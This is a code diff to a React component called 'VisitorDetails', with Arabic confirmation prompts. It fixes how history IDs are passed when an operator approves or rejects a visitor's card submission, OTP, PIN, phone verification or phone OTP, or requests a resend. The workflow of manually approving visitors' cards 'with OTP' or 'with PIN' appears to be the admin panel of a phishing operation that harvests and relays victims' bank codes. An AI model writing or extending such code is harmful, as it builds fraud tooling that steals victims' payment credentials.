@@ -531,22 +531,29 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       const bubble = bubbles.find(b => b.id === bubbleId)
       if (!bubble) return
 
+      // Extract the actual history ID by removing the type prefix
+      const getHistoryId = (id: string) => {
+        // Remove prefixes like "card-info-", "otp-", "pin-", "phone_verification-", "phone_otp-"
+        return id.replace(/^(card-info-|otp-|pin-|phone_verification-|phone_otp-)/, '')
+      }
+      const historyId = getHistoryId(bubble.id)
+
       switch (bubble.type) {
         case "card":
           if (action === "otp") {
             // Approve card with OTP - update history status
-            console.log('[Action] Card OTP clicked, bubble.id:', bubble.id, 'history:', visitor.history)
-            await updateHistoryStatus(visitor.id, bubble.id, "approved_with_otp", visitor.history || [])
+            console.log('[Action] Card OTP clicked, bubble.id:', bubble.id, 'historyId:', historyId, 'history:', visitor.history)
+            await updateHistoryStatus(visitor.id, historyId, "approved_with_otp", visitor.history || [])
             console.log('[Action] Status updated to approved_with_otp')
             await updateApplication(visitor.id, { cardStatus: "approved_with_otp" })
           } else if (action === "pin") {
             // Approve card with PIN - update history status
-            await updateHistoryStatus(visitor.id, bubble.id, "approved_with_pin", visitor.history || [])
+            await updateHistoryStatus(visitor.id, historyId, "approved_with_pin", visitor.history || [])
             await updateApplication(visitor.id, { cardStatus: "approved_with_pin" })
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
               // Reject card - update history status
-              await updateHistoryStatus(visitor.id, bubble.id, "rejected", visitor.history || [])
+              await updateHistoryStatus(visitor.id, historyId, "rejected", visitor.history || [])
               await updateApplication(visitor.id, { cardStatus: "rejected" })
             }
           }
@@ -555,11 +562,11 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         case "otp":
           if (action === "approve") {
             // Approve OTP using proper handler
-            await handleOtpApproval(visitor.id, bubble.id, visitor.history || [])
+            await handleOtpApproval(visitor.id, historyId, visitor.history || [])
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
               // Reject OTP using proper handler
-              await handleOtpRejection(visitor.id, bubble.id, visitor.history || [])
+              await handleOtpRejection(visitor.id, historyId, visitor.history || [])
             }
           }
           break
@@ -567,11 +574,11 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         case "phone_verification":
           if (action === "approve") {
             // Approve phone verification using proper handler
-            await handlePhoneVerificationApproval(visitor.id, bubble.id, visitor.history || [])
+            await handlePhoneVerificationApproval(visitor.id, historyId, visitor.history || [])
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض رقم الهاتف؟")) {
               // Reject phone verification using proper handler
-              await handlePhoneVerificationRejection(visitor.id, bubble.id, visitor.history || [])
+              await handlePhoneVerificationRejection(visitor.id, historyId, visitor.history || [])
             }
           }
           break
@@ -579,7 +586,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         case "phone_otp":
           if (action === "approve") {
             if (hasMultipleAttempts) {
-              await handlePhoneOtpApproval(visitor.id, bubbleId, history)
+              await handlePhoneOtpApproval(visitor.id, historyId, history)
             } else {
               await updateApplication(visitor.id, { phoneOtpStatus: "approved" })
             }
@@ -587,7 +594,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود الهاتف؟")) {
               if (hasMultipleAttempts) {
-                await handlePhoneOtpRejection(visitor.id, bubbleId, history)
+                await handlePhoneOtpRejection(visitor.id, historyId, history)
               } else {
                 await updateApplication(visitor.id, {
                   phoneOtpStatus: "rejected"
@@ -596,7 +603,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               // Phone OTP rejected
             }
           } else if (action === "resend") {
-            await updateHistoryStatus(visitor.id, bubbleId, "resend", visitor.history || [])
+            await updateHistoryStatus(visitor.id, historyId, "resend", visitor.history || [])
             await updateApplication(visitor.id, {
               phoneOtp: "",
               phoneOtpStatus: "show_phone_otp"
